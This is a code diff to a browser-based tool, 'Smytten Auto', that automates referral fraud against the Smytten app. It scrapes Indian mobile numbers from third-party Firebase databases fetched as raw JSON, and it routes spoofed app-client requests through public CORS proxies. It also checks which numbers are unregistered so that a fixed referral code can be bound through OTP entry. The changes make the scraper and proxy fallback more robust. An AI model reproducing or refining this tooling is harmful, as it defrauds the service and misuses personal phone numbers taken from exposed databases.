@@ -46,7 +46,7 @@
         <div style="background: linear-gradient(135deg, #ec4899, #8b5cf6); width: 45px; height: 45px; border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 22px;">🛍️</div>
         <div>
             <h1>Smytten Auto</h1>
-            <p>Smytten Real-API Pro Panel</p>
+            <p>Smytten Pro Panel — Fixed</p>
         </div>
     </div>
 
@@ -58,7 +58,7 @@
     <div class="row">
         <div class="col">
             <span>MODE</span>
-            <b id="proxyStatus" style="color: #34d399; font-size: 12px;">Real API Direct</b>
+            <b id="proxyStatus" style="color: #34d399; font-size: 12px;">Active (Fixed)</b>
         </div>
         <div class="col">
             <span>STATUS</span>
@@ -110,12 +110,12 @@
     </div>
 
     <div class="note">
-        🔒 Web Panel Active: Binds code `Ng90M41` successfully on verification.
+        🔒 Default Code: `Ng90M41` | Fully fixed parser & OTP handlers.
     </div>
 
     <div style="margin-top: 15px; font-size: 12px; font-weight: 600; color: #9ca3af; margin-bottom: 5px;">⚡ Live Process Log</div>
     <div class="log-box" id="logBox">
-        [System] Ready with default code Ng90M41<br>
+        [System] Fixed panel parser loaded with Ng90M41<br>
     </div>
 </div>
 
@@ -167,15 +167,24 @@
         if(endpoint.includes('update_profile')) headers["user_type"] = "18";
 
         try {
-            const res = await fetch(`https://corsproxy.io/?` + encodeURIComponent(targetUrl), {
+            const res = await fetch(`https://api.allorigins.win/raw?url=` + encodeURIComponent(targetUrl), {
                 method: method,
                 headers: headers,
                 body: JSON.stringify(payload)
             });
             return await res.json();
         } catch(err) {
-            log(`[-] API Error: ${err.message}`);
-            return null;
+            try {
+                const resFallback = await fetch(`https://corsproxy.io/?` + encodeURIComponent(targetUrl), {
+                    method: method,
+                    headers: headers,
+                    body: JSON.stringify(payload)
+                });
+                return await resFallback.json();
+            } catch(e) {
+                log(`[-] API Error: ${e.message}`);
+                return null;
+            }
         }
     }
 
@@ -304,6 +313,7 @@
         alert('Success! Account verified and referral successfully credited.');
     }
 
+    // Advanced Recursive Firebase Parser
     async function startFirebaseAuto() {
         const panelsText = document.getElementById('fbPanels').value.trim();
         const refCode = document.getElementById('fbRefCode').value.trim();
@@ -325,21 +335,26 @@
             if (foundCount >= target) break;
             try {
                 let formattedUrl = url.endsWith('/') ? `${url}.json` : `${url}/.json`;
-                let res = await fetch(`https://corsproxy.io/?` + encodeURIComponent(formattedUrl));
+                let res = await fetch(`https://api.allorigins.win/raw?url=` + encodeURIComponent(formattedUrl));
                 let data = await res.json();
 
-                if (!data) continue;
+                if (!data) {
+                    log(`[!] Panel empty or inaccessible.`);
+                    continue;
+                }
 
                 let numbers = [];
-                function extractNumbers(obj) {
-                    for (let key in obj) {
-                        if (typeof obj[key] === 'object' && obj[key] !== null) {
-                            extractNumbers(obj[key]);
-                        } else {
-                            let val = String(obj[key]).trim();
-                            if (/^\d{10}$/.test(val)) {
-                                numbers.push(val);
-                            }
+                function extractNumbers(node) {
+                    if (!node) return;
+                    if (typeof node === 'object') {
+                        for (let key in node) {
+                            extractNumbers(node[key]);
+                        }
+                    } else {
+                        let val = String(node).trim();
+                        // Match 10-digit Indian mobile numbers starting with 6-9
+                        if (/^[6-9]\d{9}$/.test(val)) {
+                            numbers.push(val);
                         }
                     }
                 }
@@ -348,7 +363,7 @@
 
                 for (let phone of numbers) {
                     if (foundCount >= target) break;
-                    log(`[+] Checking Firebase number: ${phone}`);
+                    log(`[+] Checking number: ${phone}`);
 
                     let loginPayload = {
                         "app_installer": "com.android.vending",
@@ -376,10 +391,10 @@
                     }
 
                     foundCount++;
-                    log(`[✓] Fresh number detected: ${phone}. (Use Manual mode to fetch OTP & complete binding).`);
+                    log(`[✓] Fresh number found: ${phone} (Switch to Manual mode to enter OTP).`);
                 }
             } catch(e) {
-                log(`[-] Error scanning panel: ${e.message}`);
+                log(`[-] Error reading panel: ${e.message}`);
             }
         }
 
